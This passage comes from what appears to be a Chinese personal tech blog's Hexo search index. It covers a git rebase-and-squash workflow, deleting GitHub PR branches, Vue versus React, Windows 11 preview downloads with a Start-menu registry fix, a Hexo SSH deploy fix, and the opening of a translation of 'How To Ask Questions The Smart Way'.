            <tag> Windows，oh-my-posh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git操作流程</title>
      <link href="2021/06/01/git-cao-zuo-liu-cheng/"/>
      <url>2021/06/01/git-cao-zuo-liu-cheng/</url>
      
        <content type="html"><![CDATA[<p>先学一下git命令的含义,判断什么情况下使用</p><blockquote><p>前置条件已安装好git环境,并有远程仓库</p></blockquote><ol><li><p>先拉取指定远程仓库别人的提交<code>git fetch teamds</code></p></li><li><p>合并<code>git rebase teamds/main</code></p><img src="https://ali.frist-art.cn/wx/tianyan/photo/image-20210723140007775.png" alt="image-20210723140007775" style="zoom:67%;"><ul><li><p>出现冲突,按照提示进入产生冲突的文件中,手动判断并解决冲突</p><blockquote><p>当 rebase 发生冲突时，git 会停止 rebase 并让你去解决冲突，<strong>解决完之后不能直接 commit</strong>，<strong>而是应该用 continue 参数继续执行 rebase</strong></p><pre><code># 解决冲突之后# 如果是合并代码时产生的冲突，需要把修改的文件放入暂存区git add &lt;冲突的文件&gt;git rebase --continue# or# 不解决冲突，还原回 rebase 之前的状态git rebase --abort</code></pre></blockquote></li></ul></li><li><p>查看当前git所管理的文档的状态<code>git status</code>   </p><ul><li><p>当工作树清除时 ,此时可以提交<code>git push</code>操作，工作树干净的时候没有红绿颜色。</p><p><img src="https://ali.frist-art.cn/wx/tianyan/photo/image-20210723121532675.png" alt="image-20210723121532675"></p></li></ul></li><li><p>将所有的变更提交到git本地仓库的暂存区<code>git add -A</code><br>如图所示<img src="https://ali.frist-art.cn/wx/tianyan/photo/image-20210723123230945.png" alt="image-20210723123230945"></p></li><li><p>将添加到暂存区的内容提交<code>git commit -m &quot;docs:提交723log&quot;</code>,</p><blockquote><p>​    git commit 主要是将暂存区里的改动给提交到本地的版本库。每次使用git commit 命令我们都会在本地版本库生成一个40位的哈希值，这个哈希值也叫commit-id，<br>​    commit-id在版本回退的时候是非常有用的，它相当于一个快照,可以在未来的任何时候通过与git reset的组合命令回到这里.</p></blockquote><ul><li><p>提交的内容添加一段描述信息<code>-m &quot;docs:提交723log&quot;</code> </p></li><li><p>仅有一个commit提交的情况,可以直接<code>git push &lt;仓库源别名&gt;/&lt;分支名&gt;</code><br><img src="https://ali.frist-art.cn/wx/tianyan/photo/image-20210723123617169.png" alt="image-20210723123617169"></p></li><li><p>如果本地有多个<code>commit</code>提交一定要在本地合并,</p><ul><li><p>查看远程和本地的log<code>git log --oneline --decorate --graph --all</code> <img src="https://ali.frist-art.cn/wx/tianyan/photo/image-20210723132026382.png" alt="image-20210723132026382"></p></li><li><p>退出查看log模式,在底部输入字母<code>q</code><img src="https://ali.frist-art.cn/wx/tianyan/photo/image-20210723132312106.png" alt="image-20210723132312106"></p></li><li><p>合并多个commit<code>git rebase -i HEAD~3</code>,看上面的log信息提示有3个commit,那么后面<code>HEAD~</code>的数字就是3,依次类推<img src="https://ali.frist-art.cn/wx/tianyan/photo/image-20210723132906415.png" alt="image-20210723132906415"><img src="https://ali.frist-art.cn/wx/tianyan/photo/image-20210723132935765.png" alt="image-20210723132935765"></p></li><li><p>输入字母<code>i</code>,修改内容<img src="https://ali.frist-art.cn/wx/tianyan/photo/image-20210723133110326.png" alt="image-20210723133110326"></p></li><li><p>合并多个commit操作以及保存退出输入<code>:wq</code><img src="https://ali.frist-art.cn/wx/tianyan/photo/image-20210723133625872.png" alt="image-20210723133625872"></p></li><li><p>合并的提示信息,输出合并后的描述信息,退出并保存<code>:wq</code><img src="C:%5CUsers%5C58387%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210723133756341.png" alt="image-20210723133756341"></p></li><li><p>再次查看log输入<code>git log --oneline --decorate --graph --all</code><img src="https://ali.frist-art.cn/wx/tianyan/photo/image-20210723134928321.png" alt="image-20210723134928321"></p></li></ul></li></ul></li></ol><p>6.将提交的版本推送到远程仓库<code>git push forkds le</code></p><blockquote><p><code>git push forkds le</code>中的forkds是仓库的别名,le是仓库的分支,</p></blockquote><p><img src="https://ali.frist-art.cn/wx/tianyan/photo/image-20210723135444133.png" alt="image-20210723135444133"></p><h3 id="简约的操作流程"><a href="#简约的操作流程" class="headerlink" title="简约的操作流程"></a>简约的操作流程</h3><pre><code>0.查看git状态    git status    如果本地有修改跳到第1步，    如果本地没有任何更改跳到第4步做到第6步。1.添加暂存区    git add -A2.提交版本    git commit -m &quot;docs:99&quot;3.查看log    git log --oneline --decorate --graph --all    自行判断是否存在多个commit提交,多个需要合并    git rebase -i HEAD~&lt;合并的提交数量&gt;    详情参考上面的第5条步骤中多个commit的情况4.拉取远程    git fetch teamds5.合并    git rebase teamds/main    &gt; 出现冲突时当 rebase 发生冲突时，git 会停止 rebase 并让你去解决冲突，解决完之后不能直        接 commit，而是应该用 continue 参数继续执行 rebase    &gt; 解决冲突之后      如果是合并代码时产生的冲突，需要把修改的文件放入暂存区      git add &lt;冲突的文件&gt;      git rebase --continue6.查看状态    git status7.推送    git push forkds/99 -f8.发起PR--不需要99操作,99推送完在群里讲一下,茂宏和兔兔看到会合并,合并完后按照完整流程步骤走</code></pre>]]></content>
      
      
      <categories>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
            <tag> 编辑器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GitHub PR 合并后自动删除相应的分支</title>
      <link href="2021/05/26/github-pr-he-bing-hou-zi-dong-shan-chu-xiang-ying-de-fen-zhi/"/>
      <url>2021/05/26/github-pr-he-bing-hou-zi-dong-shan-chu-xiang-ying-de-fen-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="GitHub-PR-合并后自动删除相应的分支"><a href="#GitHub-PR-合并后自动删除相应的分支" class="headerlink" title="GitHub PR 合并后自动删除相应的分支"></a>GitHub PR 合并后自动删除相应的分支</h1><p>GitHub 默认不会删除和 PR 关连的 remote 分支，久而久之，随着 PR 的数量的增加，remote 分支也越来越多。合并后的 PR 相关的修改内容在 GitHub 面板里能够查看到，所以即使删除了和 PR 相关的分支也没有太大影响，但是这样对整个工作流来说就增加了一步额外的操作。</p><p>有两种手动删除 GitHub remote 分支的方式：</p><ol><li><p>GitHub branches 页面可以删除 remote 分支，删除后 local 的 remote branch 缓存需要手动清理一下</p><pre><code>git remote prune &lt;remote-name&gt;</code></pre></li><li><p>命令行删除 remote 分支</p><pre><code>git push origin :&lt;branch-name&gt;</code></pre><p>如果需要清理 local 的 remote branch 缓存，同上</p><h2 id="自动删除-remote-分支"><a href="#自动删除-remote-分支" class="headerlink" title="自动删除 remote 分支"></a>自动删除 remote 分支</h2><p>拥有仓库管理员权限的用户可以配置 PR 合并后自动删除相应的分支。</p><ol><li>打开仓库主页面</li><li>打开 <strong>Settings</strong></li><li>在 <strong>Merge button</strong> 下面，勾选 <strong>Automatically delete head branches</strong></li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://help.github.com/en/github/administering-a-repository/managing-the-automatic-deletion-of-branches" target="_blank" rel="noopener">Managing the automatic deletion of branches</a>, GitHub</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git，github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue和React的区别</title>
      <link href="2021/05/24/vue-he-react-de-qu-bie/"/>
      <url>2021/05/24/vue-he-react-de-qu-bie/</url>
      
        <content type="html"><![CDATA[<h2 id="个人理解Vue和React区别"><a href="#个人理解Vue和React区别" class="headerlink" title="个人理解Vue和React区别"></a>个人理解Vue和React区别</h2><p> Vue和React相同点非常多：</p><ol><li><p>都使用Virtural DOM</p></li><li><p>都使用组件化思想，流程基本一致</p></li><li><p>都是响应式，推崇单向数据流</p></li><li><p>都有成熟的社区，都支持服务端渲染</p></li><li><p>语法上的区别</p><h5 id="语法上的区别"><a href="#语法上的区别" class="headerlink" title="语法上的区别"></a>语法上的区别</h5><p><strong>Vue 使用的是 web 开发者更熟悉的模板与特性</strong></p><p>vue语法更符合Web开发者的开发习惯,vue采用的是模板+JS+CSS的组合模式呈现,跟之前的前端HTML+JS+CSS更好的配合,可以说<strong>Vue更加注重web开发者的习惯</strong></p><p><strong>React 的特色在于函数式编程的理念和丰富的技术选型</strong></p><p>Vue 比起 React 更容易被前端工程师接受，这是一个直观的感受</p><p>总结:<strong>React 是手动挡，Vue 是自动挡。</strong></p></li></ol><blockquote><p>在vue作者的评价中曾经提过:</p><p>这里我可以大方地承认，如果多年以后要论历史地位，React 肯定是高于 Vue 的。</p></blockquote><p>参考文章:<a href="http://caibaojian.com/vue-vs-react.html" target="_blank" rel="noopener">http://caibaojian.com/vue-vs-react.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win11安装教程</title>
      <link href="2021/05/10/win11-an-zhuang-jiao-cheng/"/>
      <url>2021/05/10/win11-an-zhuang-jiao-cheng/</url>
      
        <content type="html"><![CDATA[<h3 id="Windows11-Insider-Preview-10-0-22000-51简体中文专业版"><a href="#Windows11-Insider-Preview-10-0-22000-51简体中文专业版" class="headerlink" title="Windows11 Insider Preview 10.0.22000.51简体中文专业版"></a><strong>Windows11 Insider Preview 10.0.22000.51简体中文专业版</strong></h3><p><strong>官方推送的是 22000.51，是由 22000.1 和累积更新 KB5004564 组成。</strong></p><p><strong>因此，在本帖，两个版本均提供分享。</strong></p><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210701135634715.png" alt="image-20210701135634715"></p><p>**一、Build 22000.51（推送版本）<br>这一版本是直接将更新进行集成。无漏掉集成的更新。未启用任何其他功能。（大小为 4.56GB）<br>链接：<a href="https://pan.baidu.com/s/1nNReYjOK0WAnqKXJvDMWqA" target="_blank" rel="noopener">https://pan.baidu.com/s/1nNReYjOK0WAnqKXJvDMWqA</a><br>提取码：9248</p><p>**</p><p><strong>链接：<a href="https://pan.xunlei.com/s/VMdNAaZVaCKmrd-HzSAdcwJ-A1" target="_blank" rel="noopener">https://pan.xunlei.com/s/VMdNAaZVaCKmrd-HzSAdcwJ-A1</a></strong><br><strong>提取码：uwx3</strong></p><p><strong>二、Build 22000.1（无任何累积更新）(貌似有点卡顿 尽量不要测试此版本)</strong><br><strong>这一版本是在转制过程开始前，将 Build 22000.51 中的所有更新都删除后获得。（大小为 4.20GB）</strong><br><strong>链接：<a href="https://pan.baidu.com/s/1OoqScPh1ugMPpdLZURmoNQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1OoqScPh1ugMPpdLZURmoNQ</a></strong><br><strong>提取码：9248</strong></p><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210701135712019.png" alt="image-20210701135712019"></p><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210701135723329.png" alt="image-20210701135723329"></p><p><strong>如若发现win11的菜单变成以前的了，请进行如下操作:</strong></p><blockquote><p>1、 打开注册表编辑器；</p><p>2、进入HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced</p><p>3、 双击 Start_ShowClassicMode 并将其赋值为 0；没有就新建一个dword32的Start_ShowClassicMode</p><p>4、 重启Win11后，就能看到Win11的菜单了；</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> win11 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo发生error：spawn failed错误的解决方法</title>
      <link href="2020/08/07/hexo-fa-sheng-error-spawn-failed-cuo-wu-de-jie-jue-fang-fa/"/>
      <url>2020/08/07/hexo-fa-sheng-error-spawn-failed-cuo-wu-de-jie-jue-fang-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="hexo发生error：spawn-failed错误的解决方法"><a href="#hexo发生error：spawn-failed错误的解决方法" class="headerlink" title="hexo发生error：spawn failed错误的解决方法"></a>hexo发生error：spawn failed错误的解决方法</h1><p>hexo突然上传不了，出错了。</p><p>今天hexo突然部署不了文章了，错误页面如下。</p><p><img src="https://raw.githubusercontent.com/leblog/img/main/blog/image-20210607182538223.png" alt="image-20210607182538223"></p><p>然后就去github仓库看了一下，发下之前的ssh key没了，重新设了一个也连接不上。最后找到一个方法。</p><p>在存放key的目录下新建config文件。</p><p><img src="https://raw.githubusercontent.com/leblog/img/main/blog/image-20210607194226257.png" alt="image-20210607194226257"></p><p>填入以下内容</p><pre><code>Host github.comUser 你GitHub的邮箱Hostname ssh.github.comPreferredAuthentications publickeyIdentityFile ~/.ssh/id_rsaPort 443</code></pre><p>然后用 <code>ssh -T git@github.com</code>命令测试能否连接</p><p>如果没有出现ssh不能连接的话，忽略以上内容</p><p>接着回到博客的根目录</p><p>第一种方法：</p><p>删除.deploy_git文件</p><p>然后输入<code>git config --gloabl core.autocrlf false</code></p><p>重新hexo clean</p><p>hexo g</p><p>hexo d</p><p>部署</p><p>但是发现好像只是一次性的。并不能永久解决</p><p>第二种方法：</p><p>打开_config.yml配置文件</p><p>修改以下内容</p><p>deploy:</p><p>type: git</p><p>repo: <a href="https://github.com/yourname/yourname.github.io.git" target="_blank" rel="noopener">https://github.com/yourname/yourname.github.io.git</a></p><p>branch: master</p><p>其中的repo修改为</p><p><a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:yourname/yourname.github.io.git</p>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提问的智慧</title>
      <link href="2020/07/30/ti-wen-de-zhi-hui/"/>
      <url>2020/07/30/ti-wen-de-zhi-hui/</url>
      
        <content type="html"><![CDATA[<h1 id="提问的智慧"><a href="#提问的智慧" class="headerlink" title="提问的智慧"></a>提问的智慧</h1><p><a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/pulls" target="_blank" rel="noopener"><img src="https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat-square" alt="PRs Welcome"></a></p><p><strong>How To Ask Questions The Smart Way</strong></p><p>Copyright © 2001,2006,2014 Eric S. Raymond, Rick Moen</p><p>本指南英文版版权为 Eric S. Raymond, Rick Moen 所有。</p><p>原文网址：<a href="http://www.catb.org/~esr/faqs/smart-questions.html" target="_blank" rel="noopener">http://www.catb.org/~esr/faqs/smart-questions.html</a></p><p>Copyleft 2001 by D.H.Grand(nOBODY/Ginux), 2010 by Gasolin, 2015 by Ryan Wu</p><p>本中文指南是基于原文 3.10 版以及 2010 年由 <a href="https://github.com/gasolin" target="_blank" rel="noopener">Gasolin</a> 所翻译版本的最新翻译；</p><p>协助指出翻译问题，<strong>请<a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/issues/new" target="_blank" rel="noopener">发 Issue</a>，或直接<a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/compare" target="_blank" rel="noopener">发 Pull Request</a> 给我。</strong></p><p>本文另有<a href="README.md">繁體中文版</a>。</p><h2 id="原文版本历史"><a href="#原文版本历史" class="headerlink" title="原文版本历史"></a><a href="history.md">原文版本历史</a></h2><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul><li><a href="#声明">声明</a></li><li><a href="#简介">简介</a></li><li><a href="#在提问之前">在提问之前</a></li><li><a href="#当你提问时">当你提问时</a><ul><li><a href="#慎选提问的论坛">慎选提问的论坛</a></li><li><a href="#stack-overflow">Stack Overflow</a></li><li><a href="#网站和-irc-论坛">网站和 IRC 论坛</a></li><li><a href="#第二步使用项目邮件列表">第二步，使用项目邮件列表</a></li><li><a href="#使用有意义且描述明确的标题">使用有意义且描述明确的标题</a></li><li><a href="#使问题容易回复">使问题容易回复</a></li><li><a href="#用清晰、正确、精准且语法正确的语句">用清晰、正确、精准且语法正确的语句</a></li><li><a href="#使用易于读取且标准的文件格式发送问题">使用易于读取且标准的文件格式发送问题</a></li><li><a href="#精确地描述问题并言之有物">精确地描述问题并言之有物</a></li><li><a href="#话不在多而在精">话不在多而在精</a></li><li><a href="#别动辄声称找到-bug">别动辄声称找到 Bug</a></li><li><a href="#低声下气不能代替你的功课">低声下气不能代替你的功课</a></li><li><a href="#描述问题症状而非你的猜测">描述问题症状而非你的猜测</a></li><li><a href="#按发生时间先后列出问题症状">按发生时间先后列出问题症状</a></li><li><a href="#描述目标而不是过程">描述目标而不是过程</a></li><li><a href="#别要求使用私人电邮回复">别要求使用私人电邮回复</a></li><li><a href="#清楚明确的表达你的问题以及需求">清楚明确的表达你的问题以及需求</a></li><li><a href="#询问有关代码的问题时">询问有关代码的问题时</a></li><li><a href="#别把自己家庭作业的问题贴上来">别把自己家庭作业的问题贴上来</a></li><li><a href="#去掉无意义的提问句">去掉无意义的提问句</a></li><li><a href="#即使你很急也不要在标题写紧急">即使你很急也不要在标题写紧急</a></li><li><a href="#礼多人不怪而且有时还很有帮助">礼多人不怪，而且有时还很有帮助</a></li><li><a href="#问题解决后加个简短的补充说明">问题解决后，加个简短的补充说明</a></li></ul></li><li><a href="#如何解读答案">如何解读答案</a><ul><li><a href="#rtfm-和-stfw如何知道你已完全搞砸了">RTFM 和 STFW：如何知道你已完全搞砸了</a></li><li><a href="#如果还是搞不懂">如果还是搞不懂</a></li><li><a href="#处理无礼的回应">处理无礼的回应</a></li></ul></li><li><a href="#如何避免扮演失败者">如何避免扮演失败者</a></li><li><a href="#不该问的问题">不该问的问题</a></li><li><a href="#好问题与蠢问题">好问题与蠢问题</a></li><li><a href="#如果得不到回答">如果得不到回答</a></li><li><a href="#如何更好地回答问题">如何更好地回答问题</a></li><li><a href="#相关资源">相关资源</a></li><li><a href="#鸣谢">鸣谢</a></li></ul><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>许多项目在他们的使用协助/说明网页中链接了本指南，这么做很好，我们也鼓励大家都这么做。但如果你是负责管理这个项目网页的人，请在超链接附近的显著位置上注明：</p><p><strong>本指南不提供此项目的实际支持服务！</strong></p><p>我们已经深刻领教到少了上述声明所带来的痛苦。因为少了这点声明，我们不停地被一些白痴纠缠。这些白痴认为既然我们发布了这本指南，那么我们就有责任解决世上所有的技术问题。</p><p>如果你因寻求某些帮助而阅读本指南，并在离开时还觉得可以从本文作者这里得到直接帮助，那你就是我们之前说的那些白痴之一。别问我们问题，我们只会忽略你。我们在这本指南中是教你如何从那些真正懂得你所遇到软件或硬件问题的人取得协助，而 99% 的情况下那不会是我们。除非你确定本指南的作者之一刚好是你所遇到的问题领域的专家，否则请不要打扰我们，这样大家都会开心一点。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在<a href="http://www.catb.org/~esr/faqs/hacker-howto.html" target="_blank" rel="noopener">黑客</a>的世界里，当你拋出一个技术问题时，最终是否能得到有用的回答，往往取决于你所提问和追问的方式。本指南将教你如何正确的提问以获得你满意的答案。</p><p>不只是黑客，现在开源（Open Source）软件已经相当盛行，你常常也可以由其他有经验的使用者身上得到好答案，这是件<strong>好事</strong>；使用者比起黑客来，往往对那些新手常遇到的问题更宽容一些。然而，将有经验的使用者视为黑客，并采用本指南所提的方法与他们沟通，同样也是能从他们身上得到满意回答的最有效方式。</p><p>首先你应该明白，黑客们喜爱有挑战性的问题，或者能激发他们思维的好问题。如果我们并非如此，那我们也不会成为你想询问的对象。如果你给了我们一个值得反复咀嚼玩味的好问题，我们自会对你感激不尽。好问题是激励，是厚礼。好问题可以提高我们的理解力，而且通常会暴露我们以前从没意识到或者思考过的问题。对黑客而言，”好问题！”是诚挚的大力称赞。</p><p>尽管如此，黑客们有着蔑视或傲慢面对简单问题的坏名声，这有时让我们看起来对新手、无知者似乎较有敌意，但其实不是那样的。</p><p>我们不讳言我们对那些不愿思考、或者在发问前不做他们该做的事的人的蔑视。那些人是时间杀手 —— 他们只想索取，从不付出，消耗我们可用在更有趣的问题或更值得回答的人身上的时间。我们称这样的人为 <code>失败者（撸瑟）</code> （由于历史原因，我们有时把它拼作 <code>lusers</code>）。</p><p>我们意识到许多人只是想使用我们写的软件，他们对学习技术细节没有兴趣。对大多数人而言，电脑只是种工具，是种达到目的的手段而已。他们有自己的生活并且有更要紧的事要做。我们了解这点，也从不指望每个人都对这些让我们着迷的技术问题感兴趣。尽管如此，我们回答问题的风格是指向那些真正对此有兴趣并愿意主动参与解决问题的人，这一点不会变，也不该变。如果连这都变了，我们就是在降低做自己最擅长的事情上的效率。</p><p>我们（在很大程度上）是自愿的，从繁忙的生活中抽出时间来解答疑惑，而且时常被提问淹没。所以我们无情的滤掉一些话题，特别是拋弃那些看起来像失败者的家伙，以便更高效的利用时间来回答<code>赢家（winner）</code>的问题。</p><p>如果你厌恶我们的态度，高高在上，或过于傲慢，不妨也设身处地想想。我们并没有要求你向我们屈服 —— 事实上，我们大多数人非常乐意与你平等地交流，只要你付出小小努力来满足基本要求，我们就会欢迎你加入我们的文化。但让我们帮助那些不愿意帮助自己的人是没有效率的。无知没有关系，但装白痴就是不行。</p><p>所以，你不必在技术上很在行才能吸引我们的注意，但你必须表现出能引导你变得在行的特质 —— 机敏、有想法、善于观察、乐于主动参与解决问题。如果你做不到这些使你与众不同的事情，我们建议你花点钱找家商业公司签个技术支持服务合同，而不是要求黑客个人无偿地帮助你。</p><p>如果你决定向我们求助，当然你也不希望被视为失败者，更不愿成为失败者中的一员。能立刻得到快速并有效答案的最好方法，就是像赢家那样提问 —— 聪明、自信、有解决问题的思路，只是偶尔在特定的问题上需要获得一点帮助。</p><p>（欢迎对本指南提出改进意见。你可以 email 你的建议至 <a href="esr@thyrsus.com">esr@thyrsus.com</a> 或 <a href="respond-auto@linuxmafia.com">respond-auto@linuxmafia.com</a>。然而请注意，本文并非<a href="http://www.ietf.org/rfc/rfc1855.txt" target="_blank" rel="noopener">网络礼节</a>的通用指南，而我们通常会拒绝无助于在技术论坛得到有用答案的建议）。</p><h2 id="在提问之前"><a href="#在提问之前" class="headerlink" title="在提问之前"></a>在提问之前</h2><p>在你准备要通过电子邮件、新闻群组或者聊天室提出技术问题前，请先做到以下事情：</p><ol><li>尝试在你准备提问的论坛的旧文章中搜索答案。</li><li>尝试上网搜索以找到答案。</li><li>尝试阅读手册以找到答案。</li><li>尝试阅读常见问题文件（FAQ）以找到答案。</li><li>尝试自己检查或试验以找到答案。</li><li>向你身边的强者朋友打听以找到答案。</li><li>如果你是程序开发者，请尝试阅读源代码以找到答案。</li></ol><p>当你提出问题的时候，请先表明你已经做了上述的努力；这将有助于树立你并不是一个不劳而获且浪费别人的时间的提问者。如果你能一并表达在做了上述努力的过程中所<strong>学到</strong>的东西会更好，因为我们更乐于回答那些表现出能从答案中学习的人的问题。</p><p>运用某些策略，比如先用 Google 搜索你所遇到的各种错误信息（搜索 <a href="http://groups.google.com/" target="_blank" rel="noopener">Google 论坛</a>和网页），这样很可能直接就找到了能解决问题的文件或邮件列表线索。即使没有结果，在邮件列表或新闻组寻求帮助时加上一句 <code>我在 Google 中搜过下列句子但没有找到什么有用的东西</code> 也是件好事，即使它只是表明了搜索引擎不能提供哪些帮助。这么做（加上搜索过的字串）也让遇到相似问题的其他人能被搜索引擎引导到你的提问来。</p><p>别着急，不要指望几秒钟的 Google 搜索就能解决一个复杂的问题。在向专家求助之前，再阅读一下常见问题文件（FAQ）、放轻松、坐舒服一些，再花点时间思考一下这个问题。相信我们，他们能从你的提问看出你做了多少阅读与思考，如果你是有备而来，将更有可能得到解答。不要将所有问题一股脑拋出，只因你的第一次搜索没有找到答案（或者找到太多答案）。</p><p>准备好你的问题，再将问题仔细的思考过一遍，因为草率的发问只能得到草率的回答，或者根本得不到任何答案。越是能表现出在寻求帮助前你为解决问题所付出的努力，你越有可能得到实质性的帮助。</p><p>小心别问错了问题。如果你的问题基于错误的假设，某个普通黑客（J. Random Hacker）多半会一边在心里想着<code>蠢问题…</code>， 一边用无意义的字面解释来答复你，希望着你会从问题的回答（而非你想得到的答案）中汲取教训。</p><p>绝不要自以为<strong>够格</strong>得到答案，你没有；你并没有。毕竟你没有为这种服务支付任何报酬。你将会是自己去<strong>挣到</strong>一个答案，靠提出有内涵的、有趣的、有思维激励作用的问题 —— 一个有潜力能贡献社区经验的问题，而不仅仅是被动的从他人处索取知识。</p><p>另一方面，表明你愿意在找答案的过程中做点什么是一个非常好的开端。<code>谁能给点提示？</code>、<code>我的这个例子里缺了什么？</code>以及<code>我应该检查什么地方</code>比<code>请把我需要的确切的过程贴出来</code>更容易得到答复。因为你表现出只要有人能指个正确方向，你就有完成它的能力和决心。</p><h2 id="当你提问时"><a href="#当你提问时" class="headerlink" title="当你提问时"></a>当你提问时</h2><h3 id="慎选提问的论坛"><a href="#慎选提问的论坛" class="headerlink" title="慎选提问的论坛"></a>慎选提问的论坛</h3><p>小心选择你要提问的场合。如果你做了下述的事情，你很可能被忽略掉或者被看作失败者：</p><ul><li>在与主题不合的论坛上贴出你的问题。</li><li>在探讨进阶技术问题的论坛张贴非常初级的问题；反之亦然。</li><li>在太多的不同新闻群组上重复转贴同样的问题（cross-post）。</li><li>向既非熟人也没有义务解决你问题的人发送私人电邮。</li></ul><p>黑客会剔除掉那些搞错场合的问题，以保护他们沟通的渠道不被无关的东西淹没。你不会想让这种事发生在自己身上的。</p><p>因此，第一步是找到对的论坛。再说一次，Google 和其它搜索引擎还是你的朋友，用它们来找到与你遭遇到困难的软硬件问题最相关的网站。通常那儿都有常见问题（FAQ）、邮件列表及相关说明文件的链接。如果你的努力（包括<strong>阅读</strong> FAQ）都没有结果，网站上也许还有报告 Bug（Bug-reporting）的流程或链接，如果是这样，链过去看看。</p><p>向陌生的人或论坛发送邮件最可能是风险最大的事情。举例来说，别假设一个提供丰富内容的网页的作者会想充当你的免费顾问。不要对你的问题是否会受到欢迎做太乐观的估计 —— 如果你不确定，那就向别处发送，或者压根别发。</p><p>在选择论坛、新闻群组或邮件列表时，别太相信名字，先看看 FAQ 或者许可书以弄清楚你的问题是否切题。发文前先翻翻已有的话题，这样可以让你感受一下那里的文化。事实上，事先在新闻组或邮件列表的历史记录中搜索与你问题相关的关键词是个极好的主意，也许这样就找到答案了。即使没有，也能帮助你归纳出更好的问题。</p><p>别像机关枪似的一次”扫射”所有的帮助渠道，这就像大喊大叫一样会使人不快。要一个一个地来。</p><p>搞清楚你的主题！最典型的错误之一是在某种致力于跨平台可移植的语言、套件或工具的论坛中提关于 Unix 或 Windows 操作系统程序界面的问题。如果你不明白为什么这是大错，最好在搞清楚这之间差异之前什么也别问。</p><p>一般来说，在仔细挑选的公共论坛中提问，会比在私有论坛中提同样的问题更容易得到有用的回答。有几个理由可以支持这点，一是看潜在的回复者有多少，二是看观众有多少。黑客较愿意回答那些能帮助到许多人的问题。</p><p>可以理解的是，老练的黑客和一些热门软件的作者正在接受过多的错发信息。就像那根最后压垮骆驼背的稻草一样，你的加入也有可能使情况走向极端 —— 已经好几次了，一些热门软件的作者从自己软件的支持中抽身出来，因为伴随而来涌入其私人邮箱的无用邮件变得无法忍受。</p><h3 id="Stack-Overflow"><a href="#Stack-Overflow" class="headerlink" title="Stack Overflow"></a>Stack Overflow</h3><p>搜索，<strong>然后</strong> 在 Stack Exchange 问。</p><p>近年来，Stack Exchange 社区已经成为回答技术及其他问题的主要渠道，尤其是那些开放源码的项目。</p><p>因为 Google 索引是即时的，在看 Stack Exchange 之前先在 Google 搜索。有很高的机率某人已经问了一个类似的问题，而且 Stack Exchange 网站们往往会是搜索结果中最前面几个。如果你在 Google 上没有找到任何答案，你再到特定相关主题的网站去找。用标签（Tag）搜索能让你更缩小你的搜索结果。</p><p>Stack Exchange 已经成长到<a href="http://stackexchange.com/sites" target="_blank" rel="noopener">超过一百个网站</a>，以下是最常用的几个站：</p><ul><li>Super User 是问一些通用的电脑问题，如果你的问题跟代码或是写程序无关，只是一些网络连线之类的，请到这里。</li><li>Stack Overflow 是问写程序有关的问题。</li><li>Server Fault 是问服务器和网管相关的问题。</li></ul><h3 id="网站和-IRC-论坛"><a href="#网站和-IRC-论坛" class="headerlink" title="网站和 IRC 论坛"></a>网站和 IRC 论坛</h3><p>本地的使用者群组（user group），或者你所用的 Linux 发行版本也许正在宣传他们的网页论坛或 IRC 频道，并提供新手帮助（在一些非英语国家，新手论坛很可能还是邮件列表）， 这些地方是开始提问的好首选，特别是当你觉得遇到的也许只是相对简单或者很普通的问题时。有广告赞助的 IRC 频道是公开欢迎提问的地方，通常可以即时得到回应。</p><p>事实上，如果程序出的问题只发生在特定 Linux 发行版提供的版本（这很常见），最好先去该发行版的论坛或邮件列表中提问，再到程序本身的论坛或邮件列表提问。（否则）该项目的黑客可能仅仅回复 “用<strong>我们的</strong>版本”。</p><p>在任何论坛发文以前，先确认一下有没有搜索功能。如果有，就试着搜索一下问题的几个关键词，也许这会有帮助。如果在此之前你已做过通用的网页搜索（你也该这样做），还是再搜索一下论坛，搜索引擎有可能没来得及索引此论坛的全部内容。</p><p>通过论坛或 IRC 频道来提供使用者支持服务有增长的趋势，电子邮件则大多为项目开发者间的交流而保留。所以最好先在论坛或 IRC 中寻求与该项目相关的协助。</p><p>在使用 IRC 的时候，首先最好不要发布很长的问题描述，有些人称之为频道洪水。最好通过一句话的问题描述来开始聊天。</p><h3 id="第二步，使用项目邮件列表"><a href="#第二步，使用项目邮件列表" class="headerlink" 